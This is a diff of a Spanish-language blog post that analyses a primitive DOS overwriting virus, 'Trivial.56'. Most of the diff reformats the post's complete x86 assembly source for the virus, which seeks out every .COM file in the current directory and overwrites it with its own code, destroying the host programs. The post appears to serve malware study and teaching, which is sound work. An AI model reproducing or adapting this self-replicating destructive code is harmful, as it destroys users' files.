@@ -16,7 +16,7 @@ El virus simplemente sobrescribe otros archivos COM con el código viral. Es la 
 más primitiva, pero es muy agresiva y destructiva. Todas las generaciones del 
 virus son idénticas.
 
-![infection](/assets/images/poc-virus-x86dos-com-overwriting/infection.png){:width="350"}
+{% img infection.png | {"width":"350"} %}
 
 Generalmente nada se preserva de los archivos huéspedes ya que son destruidos por la sobrescritura. 
 La desinfección consiste en eliminar todos los archivos infectados.
@@ -26,7 +26,7 @@ La infección se realiza en el momento de ejecución infectando todos los archiv
 directorio actual a excepción de aquellos con atributo READ-ONLY, HIDDEN o SYSTEM.
 
 ## Flujo de ejecución
-![flow](/assets/images/poc-virus-x86dos-com-overwriting/flow.png){:width="350"}
+{% img flow.png | {"width":"350"} %}
 
 ## Análisis estático
 Hex dump de un archivo sano de tamaño 80 bytes:
@@ -128,7 +128,7 @@ Se utilizan 6 servicios de la DOS API mediante la interrupción de software 21h.
 
 ## Código fuente
 {% highlight nasm linenos %}
-;###############################################################################
+;##############################################################################
 ;# Nombre:        virus://DOS/Trivial.56
 ;# Plataforma:    Intel x86
 ;# SO:            DOS v2.0+, Win32 (mediante NTVDM)
@@ -142,52 +142,57 @@ Se utilizan 6 servicios de la DOS API mediante la interrupción de software 21h.
 ;# Stealth:       No
 ;# Payload:       No
 ;##############################################################################
-                .8086  
-                .model  tiny
 
-                assume  cs:virus, ds:virus
+.8086  
+.model tiny
 
-       virus    segment byte public 'CODE'
+assume cs:virus, ds:virus
 
-                org     100h
+virus segment byte public 'CODE'
 
-      start:    mov     ah, 4Eh               ; | AH = 4Eh 
-                xor     cx, cx                ; | CX = 0, archivos normales
-                lea     dx, search_str        ; | DS:DX -> "*.COM"
-                int     21h                   ; |_DOS API - Buscar primer archivo
+    org     100h
 
-                jnc     infect_file           ; archivo encontrado
-                jmp     exit                  ; no hay archivo
+start:    
+    mov     ah, 4Eh               ; | AH = 4Eh 
+    xor     cx, cx                ; | CX = 0, archivos normales
+    lea     dx, search_str        ; | DS:DX -> "*.COM"
+    int     21h                   ; |_DOS API - Buscar primer archivo
 
-  find_next:    mov     ah, 4Fh               ; | AH = 4Fh  
-                int     21h                   ; |_DOS API - Buscar siguiente archivo 
+    jnc     infect_file           ; archivo encontrado
+    jmp     exit                  ; no hay archivo
 
-                jc      exit                  ; no hay archivo
+find_next:    
+    mov     ah, 4Fh               ; | AH = 4Fh  
+    int     21h                   ; |_DOS API - Buscar siguiente archivo 
 
-infect_file:    mov     ah, 3Dh               ; | AH = 3Dh 
-                mov     al, 2                 ; | AL = 2, lectura y escritura
-                mov     dx, 9Eh               ; | DS:DX -> DTA + 1Eh = 9Eh (FileName)
-                int     21h                   ; |_DOS API - Abrir archivo existente
+    jc      exit                  ; no hay archivo
 
-                mov     bx, ax                ; | BX = handle del archivo 
-                mov     ah, 40h               ; | AH = 40h
-                mov     cx, virus_size        ; | CX = tamaño del virus
-                lea     dx, start             ; | DS:DX -> inicio del código viral
-                int     21h                   ; |_DOS API - Escribir en archivo/dispositivo
+infect_file:    
+    mov     ah, 3Dh               ; | AH = 3Dh 
+    mov     al, 2                 ; | AL = 2, lectura y escritura
+    mov     dx, 9Eh               ; | DS:DX -> DTA + 1Eh = 9Eh (FileName)
+    int     21h                   ; |_DOS API - Abrir archivo existente
 
-                mov     ah, 3Eh               ; | AH = 3Eh 
-                int     21h                   ; |_DOS API - Cerrar archivo
+    mov     bx, ax                ; | BX = handle del archivo 
+    mov     ah, 40h               ; | AH = 40h
+    mov     cx, virus_size        ; | CX = tamaño del virus
+    lea     dx, start             ; | DS:DX -> inicio del código viral
+    int     21h                   ; |_DOS API - Escribir en archivo/dispositivo
 
-                jmp     find_next             ; buscar siguiente
+    mov     ah, 3Eh               ; | AH = 3Eh 
+    int     21h                   ; |_DOS API - Cerrar archivo
 
-       exit:    mov     ah, 00h               ; | AH = 00h
-                int     21h                   ; |_DOS API - Retornar a DOS
+    jmp     find_next             ; buscar siguiente
 
-  search_str    db      "*.com", 00h          ; nombre comodín de búsqueda
-  virus_size    equ     ($ - start)           ; tamaño del virus
+exit:    
+    mov     ah, 00h               ; | AH = 00h
+    int     21h                   ; |_DOS API - Retornar a DOS
 
-       virus    ends
-                end     start
+search_str    db   "*.com", 00h   ; nombre comodín de búsqueda
+virus_size    equ  ($ - start)    ; tamaño del virus
+
+virus ends
+end start
 {% endhighlight %}
 
 ## Casos reales
